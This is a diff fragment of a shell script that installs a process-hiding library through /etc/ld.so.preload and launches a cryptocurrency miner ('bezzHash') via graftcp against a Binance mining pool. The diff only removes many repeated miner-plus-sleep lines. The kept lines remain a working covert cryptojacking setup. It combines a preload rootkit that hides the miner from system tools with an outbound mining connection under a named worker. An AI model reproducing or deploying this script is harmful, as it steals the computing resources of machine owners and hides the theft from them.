@@ -41,36 +41,4 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 ./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
-./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 1m
+
